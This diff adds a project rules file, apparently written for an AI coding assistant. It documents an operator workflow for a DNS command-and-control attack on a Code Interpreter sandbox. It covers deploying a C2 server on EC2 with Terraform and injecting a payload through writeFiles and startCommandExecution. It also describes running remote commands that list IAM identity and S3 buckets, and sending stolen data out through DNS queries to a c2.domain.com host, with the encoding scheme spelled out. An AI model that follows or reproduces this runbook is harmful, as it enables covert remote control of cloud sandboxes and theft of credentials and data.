@@ -1,0 +1,165 @@
+---
+description: DNS C2 deployment process and workflow
+alwaysApply: false
+---
+# DNS C2 Deployment Process
+
+## **Actual Workflow (What Really Works)**
+
+### **Complete Setup & Execution Flow**
+
+```bash
+# Terminal 1: Infrastructure Setup
+make setup-env                # Create Python venv
+source venv/bin/activate       # Activate venv
+make install                   # Install dependencies
+make terraform-yolo            # Deploy infrastructure + configure EC2
+source set_env_vars.sh         # Export environment variables
+
+# Terminal 2: Monitor DNS Server (Optional)
+make logs                      # Tail CloudWatch logs
+
+# Terminal 3: Interactive Attack Session
+make operator                  # Starts interactive shell that:
+                              # 1. Generates session ID
+                              # 2. Injects payload into Code Interpreter
+                              # 3. Opens interactive command prompt
+                              # Type commands here like: whoami, pwd, etc.
+```
+
+## **What Each Command Actually Does**
+
+### **make operator (or make shell-interactive)**
+This is the MAIN command that does everything:
+1. Generates a unique session ID (sess_xxxxxxxx)
+2. Creates the payload with that session ID
+3. Injects payload into Code Interpreter using:
+   - `writeFiles` API to write payload to c2_payload.py
+   - `startCommandExecution` to run it in background
+4. Opens interactive shell for sending commands
+5. Handles cleanup on exit (terminates session)
+
+### **make terraform-yolo**
+1. Runs `terraform init`
+2. Runs `terraform plan`
+3. Runs `terraform apply -auto-approve`
+4. Automatically calls `make configure-ec2` after infrastructure is up
+5. Configures and starts DNS server on EC2
+
+### **make configure-ec2**
+1. Downloads dns_server_with_api.py from S3 to EC2
+2. Installs Python dependencies on EC2
+3. Creates start script with correct domain
+4. Kills any existing DNS server process
+5. Starts DNS server in background with nohup
+6. Server logs to CloudWatch (/aws/ec2/dns-c2-server)
+
+### **make logs**
+- Tails CloudWatch logs in real-time
+- Shows all DNS queries, commands, and exfiltrated data
+
+## **Commands That DON'T Exist or Are Deprecated**
+
+### **❌ make sandbox**
+- References non-existent `execute_payload.py`
+- NOT part of current workflow
+- Functionality replaced by `make operator`
+
+### **❌ make test-dns** 
+- References non-existent `test_dns.py`
+- Was deleted during cleanup
+- Not needed - DNS server auto-starts with configure-ec2
+
+### **❌ make kill-session**
+- References non-existent `kill_session.py`
+- Session termination handled automatically by operator shell
+
+### **❌ Manual payload execution**
+- No need to manually run payload
+- `make operator` handles everything
+
+## **Interactive Shell Commands**
+
+Once in the operator shell (`c2>` prompt):
+
+### **Available Commands**
+- `whoami` - Execute whoami on target
+- `pwd` - Show current directory
+- `ls -la` - List files
+- `aws sts get-caller-identity` - Show IAM role
+- `aws s3 ls` - List S3 buckets
+- `logs` - View client debug log
+- `exit` - Quit and cleanup
+- `help` - Show command help
+
+## **DNS Protocol Flow**
+
+### **Command Delivery (C2 → Client)**
+1. Client polls: `getent hosts cmd.SESSION_ID.c2.domain.com`
+2. Server responds with IP:
+   - `127.0.0.1` = No command (IDLE)
+   - `10.0.0.1` = Command ready
+   - `192.168.0.1` = Session terminated
+3. Client fetches chunks: `getent hosts c0.SESSION_ID.c2.domain.com`
+4. Each chunk is an IP encoding 3 base64 chars
+
+### **Data Exfiltration (Client → C2)**
+1. Client uses `getent hosts` to trigger DNS queries
+2. Format: `SEQ.CHUNK.TOTAL.BASE64DATA.SESSION_ID.c2.domain.com`
+3. Base64 uses DNS-safe encoding (= → -)
+4. Command sequence (SEQ) increments to avoid caching
+
+## **File Locations**
+
+### **Core Files**
+- `src/attacker_shell.py` - Main operator interface (used by `make operator`)
+- `src/payload_client.py` - Client payload injected into sandbox
+- `terraform/c2-server/dns_server_with_api.py` - DNS C2 server on EC2
+
+### **Scripts**
+- `scripts/configure_ec2.sh` - EC2 configuration script
+- `set_env_vars.sh` - Environment variable export (in root)
+
+## **Common Issues & Solutions**
+
+### **"make sandbox" doesn't work**
+- **Solution**: Use `make operator` instead
+
+### **DNS server not responding**
+- **Check**: `make check-dns` to verify server is running
+- **Fix**: `make configure-ec2` to restart
+
+### **No output from commands**
+- **Check**: Type `logs` in operator shell to see client activity
+- **Issue**: DNS caching may affect multi-chunk responses
+
+### **Session timeout**
+- **Cause**: Code Interpreter sessions expire after 15 minutes
+- **Solution**: Exit and run `make operator` again
+
+## **Testing**
+
+```bash
+# Run all tests
+make test
+
+# Verbose testing
+make test-verbose
+```
+
+## **Cleanup**
+
+```bash
+# From operator shell
+c2> exit                      # Terminates session and cleans up
+
+# Destroy infrastructure
+make terraform-destroy
+```
+
+## **Important Notes**
+
+- **NO MANUAL STEPS**: Everything automated through `make operator`
+- **NO SSH NEEDED**: DNS server auto-starts via configure-ec2
+- **NO PAYLOAD UPLOAD**: Payload injected directly from local filesystem
+- **SINGLE COMMAND**: `make operator` does injection + shell in one go
